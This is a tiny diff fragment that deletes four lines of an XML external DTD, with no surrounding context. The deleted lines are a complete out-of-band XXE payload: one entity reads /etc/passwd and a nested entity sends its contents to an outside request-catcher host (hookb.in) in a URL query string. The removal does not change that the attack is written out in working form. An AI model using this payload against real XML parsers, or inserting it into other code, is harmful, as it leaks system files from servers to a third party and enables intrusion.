@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % bar "<!ENTITY &#x25; out SYSTEM 'http://hookb.in/wNMgoYmw6xCqJmrrJe3W/?content=%file;'>">
-%bar;
-%out;
